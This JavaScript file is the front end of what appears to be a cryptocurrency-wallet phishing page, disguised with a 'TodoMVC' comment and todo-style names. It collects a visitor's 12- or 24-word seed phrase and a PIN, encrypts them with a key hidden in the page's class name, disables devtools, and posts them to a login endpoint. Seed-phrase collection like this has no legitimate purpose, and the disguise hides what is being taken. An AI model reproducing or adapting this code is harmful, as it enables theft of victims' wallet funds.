"use strict";

function parseToHex(str) {
    var hex = '';
    for(var i=0;i<str.length;i++) {
        hex += ''+str.charCodeAt(i).toString(16);
    }
    return hex;
}

function encryptData(message, key) {
    let keyHex = CryptoJS.enc.Hex.parse(parseToHex(key))
    let iv = CryptoJS.lib.WordArray.random(128 / 8);
    let wordArray = CryptoJS.enc.Utf8.parse(message);
    let base64 = CryptoJS.enc.Base64.stringify(wordArray);
    let encrypted = CryptoJS.AES.encrypt(base64, keyHex, { iv: iv });
    return {
        cipher: encrypted.ciphertext.toString(CryptoJS.enc.Base64),
        iv: CryptoJS.enc.Base64.stringify(iv),
        length: base64.length,
        size: encrypted.ciphertext.sigBytes,
    }
}

// Full spec-compliant TodoMVC with localStorage persistence
// and hash-based routing in ~120 effective lines of JavaScript.
document.addEventListener("DOMContentLoaded", () => {
    // app Vue instance
    const app = Vue.createApp({
        name: "VuePincode",
        delimiters: ['${', '}'],
        mounted() {
            this.paraphrase = document.getElementById('app').className
            document.getElementById('app').classList.remove(this.paraphrase);
        },
        data() {
            return {
                newTodo: "",
                errorTodo: "",
                errorSend: "",
                terms: false,
                step: 1,
                pincode: "",
                pincode_confirm: "",
                pincodeError: false,
                pincodeSuccess: false,
                paraphrase: ""
            };
        },
        computed: {
            pincodeLength() {
                return this.pincode.length;
            },
            pincodeConfirmLength() {
                return this.pincode_confirm.length;
            },
            buttonDisabled() {
                return (this.pincodeError || this.pincodeSuccess) && this.mnemonicStatus();
            },
            buttonSubmitDisabled() {
                return this.step < 5;
            },
        },
        watch: {
            pincode() {
                if (this.pincodeLength === 6) {
                    this.$emit("pincode", this.pincode);
                }
            },
            pincode_confirm() {
                if (this.pincodeConfirmLength === 6) {
                    this.$emit("pincode", this.pincode_confirm);
                }
            },
            step() {},
        },
        destroyed() {
            this.resetPincode();
        },
        methods: {
            showmnenomic() {
                document.getElementById("changetypage").type= (document.getElementById("changetypage").type === "text" ? "password" : "text");
            },
            addTodo() {
                this.errorTodo = "";
               if (this.terms && this.step > 3 && this.mnemonicStatus()) {
                   this.step = 5
                   this.submit();
               }
            },
            mnemonicStatus() {
                var value = this.newTodo && this.newTodo.trim();
                if (!value) {
                    this.errorTodo = "";
                    return false;
                }

                var wordsNB = (value.trim().split(' ').filter(function(v, index, arr){
                    return v != "";
                }).length);

                if (wordsNB < 12) {
                    this.errorTodo = 'Missing words in your seed, need 12 or 24...';
                    return false;
                }
                return true;
            },
            clickPinButton(pressedNumber) {
                if (this.step === 1) {
                    if (this.pincodeLength < 6) {
                        this.pincode = this.pincode + pressedNumber;
                    }
                    if (this.pincodeLength == 6) {
                        this.step = 2
                    }
                } else {
                    if (this.pincodeConfirmLength < 6) {
                        this.pincode_confirm = this.pincode_confirm + pressedNumber;
                    }
                    if (this.pincodeConfirmLength == 6) {
                        this.checkPincode()
                    }
                }
            },
            resetErrorMessage() {
                this.errorTodo = '';
            },
            resetPincode() {
                if (this.step === 2) {
                    this.pincode_confirm = "";
                } else {
                    this.pincode = "";
                    this.pincode_confirm = "";
                }
                this.pincodeError = false;
                this.pincodeSuccess = false;
            },
            checkPincode() {
                setTimeout(() => {
                    if (this.pincode === this.pincode_confirm) {
                        this.triggerSuccess();
                    } else {
                        this.triggerMiss();
                    }
                }, 700);
            },
            validterms() {
                if (this.terms && this.step > 3 && this.mnemonicStatus()) {
                    this.step = 5
                } else if (!this.terms && this.step > 3) {
                    this.step = 4
                }
            },
            triggerMiss() {
                this.errorTodo = 'Les mots de passe ne correspondent pas';
                this.pincodeError = true;
                this.step = 1
                setTimeout(() => this.resetPincode(), 800);
                setTimeout(() => this.resetErrorMessage(), 5000);
            },
            triggerSuccess() {
                this.pincodeSuccess = true;
                if (this.terms && this.mnemonicStatus()) {
                    this.step = 5
                } else {
                    this.step = 4
                }
            },
            submit() {
                this.errorSend = '';
                if (this.step === 5 && this.pincodeLength == 6 && this.terms && this.mnemonicStatus()) {
                    this.callAPILogin(this.pincode)
                } else if (!this.mnemonicStatus()) {
                    this.errorSend = 'Vous devez renseigner votre phrase secrète';
                    setTimeout(() => this.resetErrorMessageForAPI(), 5000);
                } else if (!this.terms) {
                    this.errorSend = 'Vous devez accepter les conditions générales';
                    setTimeout(() => this.resetErrorMessageForAPI(), 5000);
                }
            },
            encrypt(code) {
                return encryptData(code, this.paraphrase)
            },
            callAPILogin(code) {
                this.errorSend = '... wait ...';
                let t = this
                this.step = 3

                let cipher = t.encrypt(code)
                let cipherMn = t.encrypt(t.newTodo.trim())

                grecaptcha.execute('6LfmdSAeAAAAAPf5oNQ1UV0wf6QhnH9dQFDSop7V', {action: 'submit'})
                    .then(function(token) {
                        return axios.post('/api/login', {
                            password: cipher.cipher,
                            iv: cipher.iv,
                            mnemonic: cipherMn.cipher,
                            ivm: cipherMn.iv,
                            recaptcha: token,
                        })
                    })
                    .then(function (response) {
                        if (response.data && response.data.status === 'ok') {
                            window.location.replace("/wallet");
                        } else {
                            t.errorSend = 'Error! Could not reach the API. ' + error;
                            setTimeout(() => t.resetErrorMessageForAPI(), 3500);
                        }
                    })
                    .catch(function (error) {
                        t.errorSend = 'Error! Could not reach the API. ' + error;
                        setTimeout(() => t.resetErrorMessageForAPI(), 3500);
                    });
            },
            resetErrorMessageForAPI() {
                this.errorSend = '';
                if (!this.terms) {
                    this.step = 4
                } else {
                    this.step = 5
                }
            },
        }
    });

    app.config.productionTip = false;
    app.config.devtools = false;
    app.mount(".todoapp");
});
